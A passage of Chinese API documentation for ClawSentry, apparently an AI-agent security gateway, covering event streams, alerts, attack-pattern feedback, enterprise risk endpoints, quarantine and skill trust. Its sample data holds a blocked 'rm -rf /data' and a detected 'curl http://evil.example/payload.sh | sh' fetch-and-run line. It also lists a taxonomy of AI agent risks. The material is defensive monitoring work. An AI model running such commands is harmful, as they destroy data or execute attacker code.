| `GET /report/l3-advisory/snapshot/{snapshot_id}` | 读取 snapshot 元数据，并回放该 snapshot 固定的 records。 |

```bash
curl -H "Authorization: Bearer $CS_AUTH_TOKEN" \
  http://127.0.0.1:8080/report/session/sess-001/l3-advisory/snapshots
```

---

## GET /report/stream — SSE 实时事件流 {#get-report-stream}

Server-Sent Events (SSE) 端点，提供实时的决策、告警和会话变更推送。

### 认证

支持两种认证方式：

1. **Header**: `Authorization: Bearer <token>`
2. **Query Param**: `?token=<token>`

!!! info "为什么支持 Query Param 认证"
    浏览器的 `EventSource` API 不支持自定义 HTTP 头，因此提供 query param 方式作为替代。

### 查询参数

| 参数 | 类型 | 默认值 | 说明 |
|------|------|--------|------|
| `session_id` | string | `null` | 仅推送指定会话的事件 |
| `min_risk` | string | `null` | 最低风险等级过滤（`low`/`medium`/`high`/`critical`） |
| `types` | string | 全部 | 逗号分隔的事件类型 |

**`types` 可选值：**

`decision`, `session_start`, `session_risk_change`, `alert`, `session_enforcement_change`, `defer_pending`, `defer_resolved`, `post_action_finding`, `trajectory_alert`, `pattern_candidate`, `pattern_evolved`, `l3_advisory_snapshot`, `l3_advisory_review`, `l3_advisory_job`, `l3_advisory_action`

### SSE 协议格式

```
: connected

event: decision
data: {"session_id":"session-001","event_id":"evt-001","risk_level":"high","decision":"block","tool_name":"bash","actual_tier":"L1","timestamp":"2026-03-23T10:30:00+00:00","reason":"D1: destructive tool","command":"rm -rf /data","approval_id":null,"expires_at":null}

event: session_start
data: {"session_id":"session-002","agent_id":"agent-002","source_framework":"openclaw","timestamp":"2026-03-23T10:31:00+00:00"}

event: session_risk_change
data: {"session_id":"session-001","previous_risk":"medium","current_risk":"high","trigger_event":"evt-002","latest_composite_score":2.4,"session_risk_ewma":1.9,"risk_points_sum":5,"window_risk_summary":{"window_seconds":3600,"event_count":12,"high_or_critical_count":3},"timestamp":"2026-03-23T10:32:00+00:00"}

event: alert
data: {"alert_id":"alert-abc123","severity":"high","metric":"session_risk_escalation","session_id":"session-001","current_risk":"high","latest_composite_score":2.4,"risk_points_sum":5,"message":"Session risk escalated to HIGH: 3 high-risk event(s) detected","timestamp":"2026-03-23T10:32:00+00:00"}

event: session_enforcement_change
data: {"session_id":"session-001","state":"enforced","action":"defer","high_risk_count":3,"timestamp":"2026-03-23T10:32:00+00:00"}

event: post_action_finding
data: {"event_id":"evt-003","session_id":"session-001","source_framework":"a3s-code","tier":"emergency","patterns_matched":["secret_exposure"],"score":2.7,"handling":"block","timestamp":"2026-03-23T10:33:00+00:00"}

event: trajectory_alert
data: {"session_id":"session-001","sequence_id":"seq-exfil-001","risk_level":"critical","matched_event_ids":["evt-001","evt-003"],"reason":"read secret then exfiltrate","handling":"block","window_risk_summary":{"window_seconds":3600,"high_or_critical_count":1},"timestamp":"2026-03-23T10:34:00+00:00"}

event: pattern_candidate
data: {"pattern_id":"EV-A3F8B2C1","session_id":"session-001","source_framework":"a3s-code","status":"candidate","timestamp":"2026-03-23T10:35:00+00:00"}

event: pattern_evolved
data: {"pattern_id":"EV-A3F8B2C1","action":"promoted_to_experimental","result":"promoted_to_experimental","timestamp":"2026-03-23T10:36:00+00:00"}

event: defer_pending
data: {"session_id":"session-001","approval_id":"apr-001","timeout_s":300,"timestamp":"2026-03-23T10:36:00+00:00"}

event: defer_resolved
data: {"session_id":"session-001","approval_id":"apr-001","resolved_decision":"allow","resolved_reason":"Operator approved","timestamp":"2026-03-23T10:37:00+00:00"}

event: l3_advisory_snapshot
data: {"snapshot_id":"l3snap-001","session_id":"session-001","trigger_reason":"operator_full_review","event_range":{"from_record_id":1,"to_record_id":42},"advisory_only":true,"timestamp":"2026-03-23T10:38:00+00:00"}

event: l3_advisory_job
data: {"job_id":"l3job-001","snapshot_id":"l3snap-001","session_id":"session-001","job_state":"completed","runner":"llm_provider","timestamp":"2026-03-23T10:38:02+00:00"}

event: l3_advisory_review
data: {"review_id":"l3adv-001","snapshot_id":"l3snap-001","session_id":"session-001","l3_state":"completed","risk_level":"high","recommended_operator_action":"inspect","advisory_only":true,"canonical_decision_mutated":false,"timestamp":"2026-03-23T10:38:03+00:00"}

: keepalive
```

**协议细节：**

- `: connected` —— 连接确认注释（立即刷新 HTTP 头）
- `: keepalive` —— 15 秒无事件时发送心跳
- 每个 SSE 订阅者有独立队列（最大 500 条），队满时丢弃最旧事件
- 最大并发订阅者数：100
- `latest_composite_score`、`session_risk_sum`、`session_risk_ewma`、`risk_points_sum`、`window_risk_summary` 在 SSE 中是展示/观测字段；默认不改变 canonical decision。
- watch/trajectory 类事件可携带 `window_risk_summary`，用于 Watch UI 做窗口解释，而不是重跑 L1/L2/L3。

### 各事件类型的 data 字段

#### decision

| 字段 | 说明 |
|------|------|
| `session_id` | 会话 ID |
| `event_id` | 事件 ID |
| `risk_level` | 风险等级 |
| `decision` | 判决（allow/block/defer/modify） |
| `tool_name` | 工具名称 |
| `actual_tier` | 实际决策层 |
| `timestamp` | 事件时间戳 |
| `reason` | 决策原因 |
| `command` | 执行的命令 |
| `approval_id` | 审批 ID（DEFER 时有值） |
| `expires_at` | 审批超时时间（epoch 毫秒） |

#### alert

| 字段 | 说明 |
|------|------|
| `alert_id` | 告警 ID |
| `severity` | 严重程度（high/critical） |
| `metric` | 告警指标名 |
| `session_id` | 关联会话 |
| `current_risk` | 当前风险等级 |
| `message` | 告警消息 |
| `timestamp` | 触发时间 |

#### session_start

| 字段 | 说明 |
|------|------|
| `session_id` | 会话 ID |
| `agent_id` | Agent 标识 |
| `source_framework` | 来源框架 |
| `timestamp` | 事件时间 |

#### session_risk_change

| 字段 | 说明 |
|------|------|
| `session_id` | 会话 ID |
| `previous_risk` | 变更前风险等级 |
| `current_risk` | 变更后风险等级 |
| `trigger_event` | 触发变更的事件 ID |
| `timestamp` | 事件时间 |

#### session_enforcement_change

| 字段 | 说明 |
|------|------|
| `session_id` | 会话 ID |
| `state` | 状态：`enforced`（强制中）或 `released`（已释放） |
| `action` | 强制动作：`defer`/`block`/`l3_require`（released 时为 null） |
| `high_risk_count` | 高危事件累计数 |
| `timestamp` | 事件时间 |

#### post_action_finding

| 字段 | 说明 |
|------|------|
| `event_id` | 关联事件 ID |
| `session_id` | 会话 ID |
| `source_framework` | 来源框架 |
| `tier` | 严重程度：`warn` / `escalate` / `emergency` |
| `score` | 检测评分（0.0-3.0） |
| `patterns_matched` | 命中的 post-action 护栏模式 |
| `handling` | 当前配置的处理方式：`broadcast` / `defer` / `block` |
| `timestamp` | 事件时间 |

#### trajectory_alert

| 字段 | 说明 |
|------|------|
| `session_id` | 会话 ID |
| `sequence_id` | 命中的轨迹序列 ID |
| `risk_level` | 轨迹风险等级 |
| `matched_event_ids` | 构成轨迹命中的事件 ID 列表 |
| `reason` | 轨迹命中原因 |
| `handling` | 当前配置的处理方式：`broadcast` / `defer` / `block` |
| `timestamp` | 事件时间 |

#### pattern_candidate

| 字段 | 说明 |
|------|------|
| `pattern_id` | 新提取的候选模式 ID |
| `session_id` | 关联会话 ID |
| `source_framework` | 来源框架 |
| `status` | 当前状态，固定为 `candidate` |
| `timestamp` | 事件时间 |

#### pattern_evolved

| 字段 | 说明 |
|------|------|
| `pattern_id` | 模式 ID |
| `action` | 生命周期变化结果 |
| `result` | 与 `action` 相同，便于前端和 CLI 直接消费 |
| `timestamp` | 事件时间 |

#### defer_pending

| 字段 | 说明 |
|------|------|
| `session_id` | 会话 ID |
| `approval_id` | 审批请求 ID |
| `timeout_s` | 超时时间（秒） |
| `timestamp` | 事件时间 |

#### defer_resolved

| 字段 | 说明 |
|------|------|
| `session_id` | 会话 ID |
| `approval_id` | 审批请求 ID |
| `resolved_decision` | 最终决策：`allow` / `allow-once` / `block` |
| `resolved_reason` | 运维批准/拒绝后写回的最终原因 |
| `timestamp` | 事件时间 |

#### l3_advisory_snapshot

| 字段 | 说明 |
|------|------|
| `snapshot_id` | frozen evidence snapshot ID |
| `session_id` | 会话 ID |
| `trigger_reason` / `trigger_detail` | snapshot 创建原因与细节 |
| `event_range` | 冻结的 trajectory record 范围 |
| `advisory_only` | 固定为 true |
| `timestamp` | 事件时间 |

#### l3_advisory_job

| 字段 | 说明 |
|------|------|
| `job_id` | advisory job ID |
| `snapshot_id` | 关联 snapshot |
| `session_id` | 会话 ID |
| `job_state` | `queued` / `running` / `completed` / `failed` |
| `runner` | `llm_provider` / `deterministic_local` |
| `timestamp` | 事件时间 |

#### l3_advisory_review

| 字段 | 说明 |
|------|------|
| `review_id` | advisory review ID |
| `snapshot_id` | 关联 snapshot |
| `session_id` | 会话 ID |
| `l3_state` | `pending` / `running` / `completed` / `failed` / `degraded` |
| `risk_level` | advisory 风险等级 |
| `recommended_operator_action` | `inspect` / `escalate` / `pause` / `none` 等 operator 建议 |
| `advisory_only` | 固定为 true |
| `canonical_decision_mutated` | full-review 响应中为 false；表示未重写历史 canonical decision |
| `timestamp` | 事件时间 |

### curl / JavaScript 示例

```bash
# curl（流式输出）
curl -N -H "Authorization: Bearer $CS_AUTH_TOKEN" \
  "http://127.0.0.1:8080/report/stream?types=decision,alert"

# 仅高风险事件
curl -N -H "Authorization: Bearer $CS_AUTH_TOKEN" \
  "http://127.0.0.1:8080/report/stream?min_risk=high"
```

```javascript
// 浏览器 EventSource（使用 query param 认证）
const es = new EventSource(
  "http://127.0.0.1:8080/report/stream?token=my-secret-token&types=decision,alert"
);

es.addEventListener("decision", (e) => {
  const data = JSON.parse(e.data);
  console.log(`[${data.decision}] ${data.command} — ${data.reason}`);
});

es.addEventListener("alert", (e) => {
  const data = JSON.parse(e.data);
  console.warn(`ALERT: ${data.message}`);
});
```

---

## GET /report/alerts — 告警列表 {#get-report-alerts}

返回告警列表，支持按严重程度、确认状态和时间窗口过滤。

### 查询参数

| 参数 | 类型 | 默认值 | 说明 |
|------|------|--------|------|
| `severity` | string | `null` | 过滤严重程度：`low`/`medium`/`high`/`critical` |
| `acknowledged` | string | `null` | 过滤确认状态：`true`/`false` |
| `window_seconds` | int | `null` | 时间窗口限制 |
| `limit` | int | `100` | 返回条目数量上限（1-1000） |

### 响应

```json
{
  "alerts": [
    {
      "alert_id": "alert-abc123def456",
      "severity": "high",
      "metric": "session_risk_escalation",
      "session_id": "session-001",
      "message": "Session risk escalated to HIGH: 3 high-risk event(s) detected",
      "details": {
        "previous_risk": "medium",
        "current_risk": "high",
        "high_risk_count": 3,
        "cumulative_score": 5,
        "latest_composite_score": 2.4,
        "risk_points_sum": 5,
        "window_risk_summary": {"window_seconds": 3600, "high_or_critical_count": 3},
        "trigger_event_id": "evt-003",
        "tool_name": "bash"
      },
      "triggered_at": "2026-03-23T10:30:00+00:00",
      "acknowledged": false,
      "acknowledged_by": null,
      "acknowledged_at": null
    }
  ],
  "total_unacknowledged": 5,
  "generated_at": "2026-03-23T10:31:00+00:00",
  "window_seconds": null
}
```

### curl 示例

```bash
# 所有未确认的高风险告警
curl -H "Authorization: Bearer $CS_AUTH_TOKEN" \
  "http://127.0.0.1:8080/report/alerts?severity=high&acknowledged=false"

# 最近 1 小时的告警
curl -H "Authorization: Bearer $CS_AUTH_TOKEN" \
  "http://127.0.0.1:8080/report/alerts?window_seconds=3600"
```

---

## POST /report/alerts/{id}/acknowledge — 确认告警 {#post-report-alerts-acknowledge}

将指定告警标记为已确认。

### 路径参数

| 参数 | 说明 |
|------|------|
| `id` | 告警 ID |

### 请求

```json
{
  "acknowledged_by": "operator-zhang"
}
```

| 字段 | 类型 | 必填 | 说明 |
|------|------|------|------|
| `acknowledged_by` | string | :material-close: | 确认者标识（默认 `"unknown"`） |

### 成功响应

```json
{
  "alert_id": "alert-abc123def456",
  "acknowledged": true,
  "acknowledged_by": "operator-zhang",
  "acknowledged_at": "2026-03-23T10:35:00+00:00"
}
```

### 告警不存在（404）

```json
{
  "error": "Alert 'alert-not-exist' not found"
}
```

### curl 示例

```bash
curl -X POST http://127.0.0.1:8080/report/alerts/alert-abc123def456/acknowledge \
  -H "Authorization: Bearer $CS_AUTH_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"acknowledged_by": "operator-zhang"}'
```

---

## GET /ahp/patterns — 攻击模式列表 {#get-ahp-patterns}

返回自进化模式库中所有攻击模式（需启用 `CS_EVOLVING_ENABLED=true`）。

### 响应

```json
{
  "enabled": true,
  "store_path": "/var/lib/clawsentry/evolved_patterns.yaml",
  "count": 1,
  "active_count": 1,
  "candidate_count": 0,
  "patterns": [
    {
      "id": "EV-A3F8B2C1",
      "category": "command_injection",
      "status": "experimental",
      "confidence": 0.75,
      "description": "Auto-extracted from event evt-abc123: curl http://evil.example/payload.sh | sh",
      "risk_level": "high",
      "source_framework": "a3s-code",
      "confirmed_count": 2,
      "false_positive_count": 0,
      "created_at": "2026-03-23T10:00:00+00:00"
    }
  ]
}
```

| 字段 | 说明 |
|------|------|
| `enabled` | 自进化模式库当前是否启用 |
| `store_path` | 当前持久化 YAML 路径；为空表示未配置 |
| `count` | 存储中模式总数 |
| `active_count` | 当前处于 `experimental` / `stable` 的活跃模式数量 |
| `candidate_count` | 当前处于 `candidate` 的候选模式数量 |
| `patterns` | 模式列表 |
| `id` | 模式唯一标识 |
| `description` | 自动提取时生成的描述 |
| `category` | 类别（command_injection/data_exfil/obfuscation 等） |
| `status` | 状态：`candidate`（候选）→ `experimental`（实验）→ `stable`（稳定） |
| `confidence` | 信心评分（0.0-1.0） |
| `risk_level` | 模式关联的风险等级 |
| `source_framework` | 模式最初来源框架 |
| `confirmed_count` | 被人工确认为真实攻击的次数 |
| `false_positive_count` | 被人工标记为误报的次数 |
| `created_at` | 首次提取时间 |

### curl 示例

```bash
curl -H "Authorization: Bearer $CS_AUTH_TOKEN" \
  http://127.0.0.1:8080/ahp/patterns
```

---

## POST /ahp/patterns/confirm — 模式反馈 {#post-ahp-patterns-confirm}

对候选攻击模式提交确认或拒绝反馈，推动模式在 `candidate → experimental → stable` 生命周期中进步。

### 请求

```json
{
  "pattern_id": "EV-A3F8B2C1",
  "confirmed": true
}
```

| 字段 | 类型 | 必填 | 说明 |
|------|------|------|------|
| `pattern_id` | string | :material-check: | 模式 ID |
| `confirmed` | boolean | :material-check: | `true` 确认有效，`false` 拒绝 |

### 响应

**确认成功：**
```json
{"result": "confirmed", "pattern_id": "EV-A3F8B2C1"}
```

**拒绝成功：**
```json
{"result": "fp_recorded", "pattern_id": "EV-A3F8B2C1"}
```

**模式不存在（404）：**
```json
{"error": "pattern not found"}
```

**功能未启用（403）：**
```json
{"error": "pattern evolution is disabled (CS_EVOLVING_ENABLED=0)"}
```

### curl 示例

```bash
# 确认模式
curl -X POST http://127.0.0.1:8080/ahp/patterns/confirm \
  -H "Authorization: Bearer $CS_AUTH_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"pattern_id": "EV-A3F8B2C1", "confirmed": true}'

# 拒绝模式
curl -X POST http://127.0.0.1:8080/ahp/patterns/confirm \
  -H "Authorization: Bearer $CS_AUTH_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"pattern_id": "EV-A3F8B2C1", "confirmed": false}'
```

---

## GET /ui — Web 仪表板 {#get-ui}

提供内置 Web 安全仪表板的静态文件服务。

| 路径 | 说明 |
|------|------|
| `GET /ui` | 仪表板首页（`index.html`） |
| `GET /ui/{path}` | SPA 路由——先查找静态文件，找不到则回退到 `index.html` |

仪表板前端使用 React 18 + TypeScript + Vite 构建，包含以下页面：

- **Dashboard** —— 实时决策 Feed + 指标卡 + 图表
- **Sessions** —— 会话列表 + D1-D6 雷达图 + 风险曲线
- **Alerts** —— 告警管理 + 过滤 + 确认
- **DEFER Panel** —— 倒计时 + Allow/Deny 按钮

!!! note "静态文件条件"
    仅当 `ui/dist/index.html` 存在时，`/ui` 路由才会注册。如果未构建前端资源，这些端点不可用。

---

## 通用错误响应

所有端点共享以下错误格式：

### 401 Unauthorized

```json
{
  "error": "Unauthorized"
}
```

响应头包含 `WWW-Authenticate: Bearer`。

### 400 Bad Request

```json
{
  "error": "window_seconds must be between 1 and 604800"
}
```

### 429 Rate Limited

```json
{
  "rpc_version": "sync_decision.1.0",
  "request_id": "rate-limited",
  "rpc_status": "error",
  "rpc_error_code": "RATE_LIMITED",
  "rpc_error_message": "Rate limit exceeded",
  "retry_eligible": true,
  "retry_after_ms": 1000
}
```

### 503 Service Unavailable

```json
{
  "error": "Too many SSE subscribers"
}
```

---

## GET /report/session/{id}/page — 分页会话轨迹 {#get-report-session-page}

当单个 session 事件很多时，使用分页端点按 cursor 读取，避免一次性拉取过多数据。

### 查询参数

| 参数 | 类型 | 默认值 | 说明 |
| --- | --- | --- | --- |
| `limit` | int | `100` | 每页记录数，服务端会限制上限。 |
| `cursor` | int | `null` | 下一页起点；必须大于 0。 |
| `window_seconds` | int | `null` | 限定时间窗口。 |

### curl 示例

```bash
curl -H "Authorization: Bearer $CS_AUTH_TOKEN" \
  "http://127.0.0.1:8080/report/session/sess-001/page?limit=100"
```

---

## Enterprise 条件端点 {#enterprise-endpoints}

Enterprise 端点只在企业模式启用时注册。它们与基础 `/report/*` 端点语义相近，但返回 enrich 后的企业视图。

| 端点 | 说明 |
| --- | --- |
| `GET /enterprise/health` | 企业增强健康状态。 |
| `GET /enterprise/report/summary` | 企业增强聚合统计。 |
| `GET /enterprise/report/live` | 实时企业态势快照。 |
| `GET /enterprise/report/stream` | 企业 SSE 事件流。 |
| `GET /enterprise/report/sessions` | 企业会话列表。 |
| `GET /enterprise/report/session/{id}` | 企业会话轨迹。 |
| `GET /enterprise/report/session/{id}/page` | 企业分页会话轨迹。 |
| `GET /enterprise/report/session/{id}/risk` | 企业会话风险详情。 |
| `GET /enterprise/report/alerts` | 企业告警列表。 |

!!! note "为什么单独分组"
    这些端点是条件 surface，不应和基础 Gateway API 混在一起理解。`api-coverage.json` 使用 `public_status: enterprise` 标记。

### Enterprise OS：20 类风险与三大层该查哪个接口 {#enterprise-os-risk-taxonomy-query}

如果 Enterprise OS 要回答“**当前所有 session 里 20 类风险各有多少、三大风险层各有多少**”，优先使用 Enterprise 条件端点，而不是基础 `/report/*`：

| 需求 | 首选接口 | 读取字段 | 计数口径 |
| --- | --- | --- | --- |
| 当前活跃 session 的 20 类风险分布 | `GET /enterprise/report/live?cached=true` | `by_trinityguard_subtype`、`by_trinityguard_tier`、`active_sessions`、`mapped_active_sessions` | 每个活跃 session 取最新 record 分类后计数；适合 Dashboard/Enterprise OS 顶层实时态势。 |
| 指定时间窗口内所有历史 records 的 20 类风险分布 | `GET /enterprise/report/summary?window_seconds=3600` | `trinityguard.by_subtype`、`trinityguard.by_tier`、`trinityguard.mapped_records`、`trinityguard.unmapped_records` | 按 trajectory record 计数；适合审计、报表、小时/天级统计。 |
| 会话列表逐条展示最新风险类别 | `GET /enterprise/report/sessions?status=all&limit=5000` | `sessions[].trinityguard_classification`、`enterprise.live_risk_overview` | 每个返回 session 一条最新分类；Enterprise 条件端点上限为 `limit<=5000`，基础 `/report/sessions` 仍保持 `limit<=200`。 |
| 单 session 内风险时间线/分类明细 | `GET /enterprise/report/session/{id}/risk?limit=1000` | `risk_timeline[].trinityguard_classification`、`trinityguard_summary` | 按该 session 的风险时间线逐事件计数。 |
| 实时新增事件分类 | `GET /enterprise/report/stream?types=decision,alert,trajectory_alert,post_action_finding` | 每条 SSE data 的 `trinityguard_classification`、`live_risk_overview` | 流式增量；前端可用它更新本地计数，但冷启动仍应先拉 `/enterprise/report/live` 或 `/enterprise/report/summary`。 |

!!! warning "不要混淆两套“层级”"
    - `RT1` / `RT2` / `RT3` 是 Enterprise OS 风险 taxonomy 的三大层：单智能体/原子风险、通信/交互风险、系统/群体风险。
    - `L1` / `L2` / `L3` 是 ClawSentry 决策执行层：规则引擎、语义分析、审查 Agent。它们在 `by_actual_tier` 或 `actual_tier_distribution` 中出现，不能当成 20 类风险的三大层。

#### 响应字段速查

| 字段 | 出现位置 | 含义 |
| --- | --- | --- |
| `trinityguard_classification.subtype` | session/replay/risk/SSE 单条记录 | 20 类风险的 subtype ID，例如 `prompt_injection`。 |
| `trinityguard_classification.tier` | session/replay/risk/SSE 单条记录 | 三大风险层：`RT1`、`RT2`、`RT3`。 |
| `trinityguard.by_subtype` | `/enterprise/report/summary` | 窗口内所有 trajectory records 的 subtype 计数。 |
| `trinityguard.by_tier` | `/enterprise/report/summary` | 窗口内所有 trajectory records 的 RT1/RT2/RT3 计数。 |
| `by_trinityguard_subtype` | `/enterprise/report/live`、`live_risk_overview` | 当前活跃 session 最新分类的 subtype 计数。 |
| `by_trinityguard_tier` | `/enterprise/report/live`、`live_risk_overview` | 当前活跃 session 最新分类的 RT1/RT2/RT3 计数。 |
| `trinityguard_summary.by_subtype` | `/enterprise/report/session/{id}/risk`、`/enterprise/report/session/{id}` | 单个 session 当前返回 records/timeline 的 subtype 计数。 |
| `mapped_records` / `unmapped_records` | `trinityguard` / `trinityguard_summary` | 成功映射到 20 类 taxonomy 与未映射的记录数；未映射不应被静默丢弃。 |

#### 20 类风险 taxonomy

| 三大层 | 层名 | subtype ID | 展示名 |
| --- | --- | --- | --- |
| `RT1` | Atomic Risks（单智能体/原子风险） | `prompt_injection` | Prompt Injection |
| `RT1` | Atomic Risks（单智能体/原子风险） | `jailbreak_attack` | Jailbreak Attack |
| `RT1` | Atomic Risks（单智能体/原子风险） | `sensitive_info_disclosure` | Sensitive Info Disclosure |
| `RT1` | Atomic Risks（单智能体/原子风险） | `excessive_agency` | Excessive Agency |
| `RT1` | Atomic Risks（单智能体/原子风险） | `unauthorized_code_execution` | Unauthorized Code Execution |
| `RT1` | Atomic Risks（单智能体/原子风险） | `hallucination` | Hallucination |
| `RT1` | Atomic Risks（单智能体/原子风险） | `memory_poisoning` | Memory Poisoning |
| `RT1` | Atomic Risks（单智能体/原子风险） | `tool_misuse` | Tool Misuse |
| `RT2` | Communication Risks（通信/交互风险） | `malicious_propagation` | Malicious Propagation |
| `RT2` | Communication Risks（通信/交互风险） | `misinformation_amplification` | Misinformation Amplification |
| `RT2` | Communication Risks（通信/交互风险） | `insecure_output_handling` | Insecure Output Handling |
| `RT2` | Communication Risks（通信/交互风险） | `goal_drift` | Goal Drift |
| `RT2` | Communication Risks（通信/交互风险） | `message_tampering` | Message Tampering |
| `RT2` | Communication Risks（通信/交互风险） | `identity_spoofing` | Identity Spoofing |
| `RT3` | System Risks（系统/群体风险） | `cascading_failure` | Cascading Failure |
| `RT3` | System Risks（系统/群体风险） | `sandbox_escape` | Sandbox Escape |
| `RT3` | System Risks（系统/群体风险） | `insufficient_monitoring` | Insufficient Monitoring |
| `RT3` | System Risks（系统/群体风险） | `group_hallucination` | Group Hallucination |
| `RT3` | System Risks（系统/群体风险） | `malicious_emergence` | Malicious Emergence |
| `RT3` | System Risks（系统/群体风险） | `rogue_agent` | Rogue Agent |

#### curl 示例

```bash
# 当前活跃 session：20 类风险 + 三大风险层实时计数
curl -H "Authorization: Bearer $CS_AUTH_TOKEN" \
  "http://127.0.0.1:8080/enterprise/report/live?cached=true"

# 最近 1 小时全部 trajectory records：20 类风险 + 三大风险层审计计数
curl -H "Authorization: Bearer $CS_AUTH_TOKEN" \
  "http://127.0.0.1:8080/enterprise/report/summary?window_seconds=3600"

# 单 session：风险时间线内每条记录的 subtype/tier，以及 trinityguard_summary 聚合
curl -H "Authorization: Bearer $CS_AUTH_TOKEN" \
  "http://127.0.0.1:8080/enterprise/report/session/sess-001/risk?limit=1000&window_seconds=3600"

# 企业会话列表：需要逐 session 展示最新分类时最多拉 5000 条
curl -H "Authorization: Bearer $CS_AUTH_TOKEN" \
  "http://127.0.0.1:8080/enterprise/report/sessions?status=all&limit=5000"
```

最小前端聚合逻辑：

```ts
const live = await fetchJson('/enterprise/report/live?cached=true')

// 三大风险层：RT1 / RT2 / RT3
const byTier = live.by_trinityguard_tier

// 20 类风险 subtype 计数
const bySubtype = live.by_trinityguard_subtype

// 没有映射的 active sessions 不在 bySubtype 中，UI 应同时显示 mapped_active_sessions / active_sessions
const coverage = `${live.mapped_active_sessions}/${live.active_sessions}`
```

### Enterprise overview/cache 合同

企业端点应优先返回 `system_security_posture`，用于 Enterprise OS 和 Dashboard 顶层态势展示。该对象是展示/观测合同，默认不改变 Gateway 判决。

```json
{
  "system_security_posture": {
    "level": "elevated",
    "score_0_100": 72.5,
    "window_seconds": 3600,
    "generated_at": "2026-04-25T12:00:05Z",
    "decision_affecting": false,
    "drivers": [
      {"key": "critical_sessions", "label": "Critical sessions", "value": 1},
      {"key": "high_sessions", "label": "High-risk sessions", "value": 3}
    ]
  },
  "cache_ttl_ms": 10000,
  "stale": false,
  "degraded": false,
  "degraded_reason": null,
  "active_sessions": 18,
  "high_risk_sessions": 3,
  "mapped_active_sessions": 6,
  "by_trinityguard_tier": {
    "RT1": 4,
    "RT2": 1,
    "RT3": 1
  },
  "by_trinityguard_subtype": {
    "prompt_injection": 2,
    "sensitive_info_disclosure": 1,
    "tool_misuse": 1,
    "insecure_output_handling": 1,
    "cascading_failure": 1
  }
}
```

约束：

- 顶层 `stale=true` 表示可展示但需要降级标识；不要当成空数据。
- 顶层 `degraded=true` 表示数据源不可用、节流命中或 payload cap 触发；UI 应显示 `degraded_reason` 并保留最后可用快照。
- `GET /enterprise/report/live` 可做短 TTL 缓存和 throttle；payload 超过上限时应裁剪明细列表，保留 `system_security_posture.drivers`。
- `cumulative_score` 若被透传，只能作为 legacy 字段，Enterprise OS 首选 `session_risk_ewma` 与 `system_security_posture.score_0_100`。


## GET /report/session/{id}/quarantine — session quarantine 状态 {#get-report-session-quarantine}

查询 session quarantine / mark-blocked 状态。V1 quarantine 是 ClawSentry 内部的 session 标记：后续同 session `pre_action` 会被阻断；这不等同于主机进程强制终止。

```bash
curl -H "Authorization: Bearer $CS_AUTH_TOKEN" \
  http://127.0.0.1:8080/report/session/sess-001/quarantine
```

示例响应：

```json
{
  "session_id": "sess-001",
  "quarantine": {
    "state": "quarantined",
    "effect_id": "eff-session-001",
    "mode": "mark_blocked",
    "reason_code": "policy_compromised_session",
    "durability": "volatile",
    "released_at": null
  }
}
```

## POST /report/session/{id}/quarantine — 释放 session quarantine {#post-report-session-quarantine}

显式释放 compromised-session quarantine。该释放路径独立于旧的 session-enforcement cooldown，避免高影响 session 标记被静默清除。

```bash
curl -X POST -H "Authorization: Bearer $CS_AUTH_TOKEN" \
  -H "Content-Type: application/json" \
  http://127.0.0.1:8080/report/session/sess-001/quarantine \
  -d '{"action":"release","released_by":"operator","reason":"manual review cleared"}'
```

示例响应：

```json
{
  "session_id": "sess-001",
  "released": true,
  "quarantine": null
}
```

## Skill Trust lifecycle {#skill-trust-lifecycle}

`GET /skill-trust/registry` returns the configured Gateway-owned Skill Trust records, transition history, and `registry_snapshot_id` for operator review.

Each returned record includes derived `skill_trust_grade`: `trusted`, `review`, `restricted`, `blocked`, or `disabled`. The grade is display metadata only; decisions continue to use the underlying registry state and evidence fields.

`GET /skill-trust/transition/recommendations` lists evidence-only FSPR/P2 transition recommendations. It supports `canonical_skill_id`, `metadata_record_id`, `session_id`, `severity`, `limit`, and `cursor` query filters and does not mutate registry state.

`POST /skill-trust/transition` applies one auditable lifecycle transition to a registry record. Mutating requests must include `expected_registry_snapshot_id` and `idempotency_key`; stale snapshots return a conflict instead of silently overwriting another operator or policy change.

The lifecycle API is an operator surface, not the runtime decision path. Runtime binding evidence such as `runtime_path_status`, `runtime_content_status`, `metadata_record_id`, `skill_use_ledger`, FSPR verdicts, and post-action provenance findings appears in AHP decision/replay metadata. FSPR/P2 recommendations remain evidence-only until an operator or explicit policy workflow submits a transition.

```bash
curl -H "Authorization: Bearer $CS_AUTH_TOKEN" \
  http://127.0.0.1:8080/skill-trust/registry

curl -H "Authorization: Bearer $CS_AUTH_TOKEN" \
  "http://127.0.0.1:8080/skill-trust/transition/recommendations?canonical_skill_id=skill:docs-reader&limit=20"

curl -X POST -H "Authorization: Bearer $CS_AUTH_TOKEN" \
  -H "Content-Type: application/json" \
  http://127.0.0.1:8080/skill-trust/transition \
  -d '{
    "canonical_skill_id": "skill:docs-reader",
    "target_state": "revoked",
    "reason_code": "operator_revoke",
    "expected_registry_snapshot_id": "sha256:...",
    "idempotency_key": "revoke-docs-reader-1",
    "actor": "sha256:operator-id",
    "evidence": {
      "source": "fspr",
      "finding_ids": ["fspr-hidden-output-label-rewrite"]
    }
  }'
```
